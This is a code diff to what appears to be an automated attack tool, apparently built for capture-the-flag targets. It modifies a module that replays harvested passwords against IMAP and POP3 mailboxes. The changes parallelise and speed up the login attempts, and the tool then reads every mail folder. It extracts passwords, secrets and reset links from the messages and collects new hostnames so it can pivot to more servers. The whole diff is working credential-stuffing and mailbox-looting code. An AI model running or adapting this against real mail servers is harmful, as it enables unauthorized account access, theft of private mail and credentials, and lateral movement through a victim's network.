@@ -14,6 +14,7 @@ the accounts the box itself told us about.
 
 from __future__ import annotations
 
+import concurrent.futures
 import imaplib
 import poplib
 import re
@@ -27,6 +28,7 @@ from ...data import knowledge
 
 _MAX_ATTEMPTS = 200
 _MAX_MSGS = 25
+_TIMEOUT = 6            # per mail connection — bounds the whole pass
 _COMMON = ["admin", "administrator", "root", "info", "support", "test", "mail"]
 
 
@@ -40,26 +42,38 @@ def run(host: HostReport, opts) -> None:
     pws = list(dict.fromkeys(host.creds))
     if not users or not pws:
         return
+    # Skip if we already probed this exact user/password set (the convergence
+    # loop may call us again — don't re-run identical work).
+    sig = (frozenset(u.lower() for u in users), frozenset(pws))
+    if host.__dict__.get("_mail_sig") == sig:
+        return
+    host.__dict__["_mail_sig"] = sig
 
     ip = host.resolved_ip or host.target
     utils.section(f"MAIL {ip}")
     utils.log("info", f"replaying {len(pws)} password(s) across {len(users)} "
                       f"mailbox candidate(s)", indent=1)
 
-    tried, hits = 0, 0
-    for user in users:
+    # Threaded, timeout-bounded login probe: one worker per user, each trying
+    # the known passwords until one opens the mailbox. Timeouts are the whole
+    # point — a serial, no-timeout probe of 40 users hung for ~27 minutes.
+    # Prefer IMAP (folders); fall back to POP3 only when there's no IMAP port —
+    # trying both per user just doubles connections against a rate-limiting
+    # (Dovecot auth-delay) server.
+    def probe(user):
         for pw in pws:
-            if tried >= _MAX_ATTEMPTS:
-                utils.log("dim", "mail attempt cap reached", indent=1)
-                return
-            tried += 1
-            body = None
-            if imap_p:
-                body = _imap(ip, imap_p, user, pw)
-            if body is None and pop_p:
-                body = _pop(ip, pop_p, user, pw)
-            if body is None:
+            body = (_imap(ip, imap_p, user, pw) if imap_p
+                    else _pop(ip, pop_p, user, pw))
+            if body is not None:
+                return user, pw, body
+        return None
+
+    hits = 0
+    with concurrent.futures.ThreadPoolExecutor(max_workers=12) as pool:
+        for result in pool.map(probe, users[:_MAX_ATTEMPTS]):
+            if not result:
                 continue
+            user, pw, body = result
             hits += 1
             utils.log("hot", f"mailbox login: {user}:{pw}", indent=1)
             host.add_cred(pw)
@@ -70,7 +84,6 @@ def run(host: HostReport, opts) -> None:
                 category="cred", port=imap_p or pop_p, service="mail",
                 evidence=f"{user}:{pw}"))
             _mine(host, user, body, imap_p or pop_p)
-            break            # this password works for this user; next user
     if not hits:
         utils.log("dim", "no mailbox opened with the known credentials", indent=1)
 
@@ -102,8 +115,8 @@ def _candidate_users(host: HostReport) -> List[str]:
 
 def _imap(ip, port, user, pw):
     try:
-        M = (imaplib.IMAP4_SSL(ip, port) if port == 993
-             else imaplib.IMAP4(ip, port))
+        M = (imaplib.IMAP4_SSL(ip, port, timeout=_TIMEOUT) if port == 993
+             else imaplib.IMAP4(ip, port, timeout=_TIMEOUT))
         if port == 143:
             try:
                 M.starttls()
@@ -114,13 +127,20 @@ def _imap(ip, port, user, pw):
         return None
     text = []
     try:
-        M.select("INBOX", readonly=True)
-        typ, data = M.search(None, "ALL")
-        ids = (data[0].split() if data and data[0] else [])[-_MAX_MSGS:]
-        for i in ids:
-            typ, msg = M.fetch(i, "(RFC822)")
-            if msg and msg[0]:
-                text.append(_msg_text(msg[0][1]))
+        folders = _folders(M)
+        for folder in folders:
+            try:
+                typ, data = M.select(folder, readonly=True)
+                if typ != "OK":
+                    continue
+                typ, sdata = M.search(None, "ALL")
+                ids = (sdata[0].split() if sdata and sdata[0] else [])[-_MAX_MSGS:]
+                for i in ids:
+                    typ, msg = M.fetch(i, "(RFC822)")
+                    if msg and msg[0]:
+                        text.append(_msg_text(msg[0][1]))
+            except (imaplib.IMAP4.error, OSError):
+                continue
     except (imaplib.IMAP4.error, OSError):
         pass
     finally:
@@ -131,9 +151,27 @@ def _imap(ip, port, user, pw):
     return "\n".join(text)
 
 
+def _folders(M):
+    """All selectable folders (INBOX first) — the flag can hide in Sent/Archive."""
+    names = ["INBOX"]
+    try:
+        typ, data = M.list()
+        if typ == "OK":
+            for row in data or []:
+                s = row.decode("utf-8", "replace") if isinstance(row, bytes) else str(row)
+                m = re.search(r'"([^"]+)"\s*$|(\S+)\s*$', s)
+                name = (m.group(1) or m.group(2)) if m else None
+                if name and name.upper() != "INBOX" and "\\Noselect" not in s:
+                    names.append(name)
+    except (imaplib.IMAP4.error, OSError):
+        pass
+    return names[:8]
+
+
 def _pop(ip, port, user, pw):
     try:
-        P = (poplib.POP3_SSL(ip, port) if port == 995 else poplib.POP3(ip, port))
+        P = (poplib.POP3_SSL(ip, port, timeout=_TIMEOUT) if port == 995
+             else poplib.POP3(ip, port, timeout=_TIMEOUT))
         if port == 110:
             try:
                 P.stls()
@@ -207,6 +245,14 @@ def _mine(host: HostReport, user: str, body: str, port: int) -> None:
         utils.log("hot", f"secret in mail: {val[:50]}", indent=2)
     for _u, pw in list(knowledge.find_conn_creds(body)):
         host.add_cred(pw)
+    for _lbl, pw in knowledge.find_doc_creds(body):     # prose creds in mail
+        host.add_cred(pw)
+    # a new host named in the mail (next server / webmail) -> enumerate it
+    from ..crack import _harvest_hostnames
+    for hn in _harvest_hostnames(body):
+        if host.add_hostname(hn):
+            utils.log("hot", f"host from mail: "
+                             f"{utils.c(hn, utils.C.CYAN, utils.C.BOLD)}", indent=2)
     # password-reset / onboarding links are the usual next hop
     for link in re.findall(r"https?://[^\s\"'<>]{8,120}", body or "")[:8]:
         if any(k in link.lower() for k in ("reset", "token", "verify", "invite",
